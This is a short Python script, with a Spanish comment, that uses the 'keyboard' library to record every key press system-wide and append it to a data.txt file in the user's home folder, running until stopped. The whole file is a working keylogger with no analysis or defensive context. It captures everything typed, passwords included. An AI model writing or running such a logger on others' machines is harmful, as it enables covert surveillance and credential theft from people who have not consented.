# pip install keyboard
import os
import keyboard

file_path = os.path.expanduser("~/data.txt")  # Guarda en tu HOME

def pressedKeys(key):
    with open(file_path, 'a') as file:
        file.write(' ' if key.name == 'space' else key.name)

keyboard.on_press(pressedKeys)
keyboard.wait()

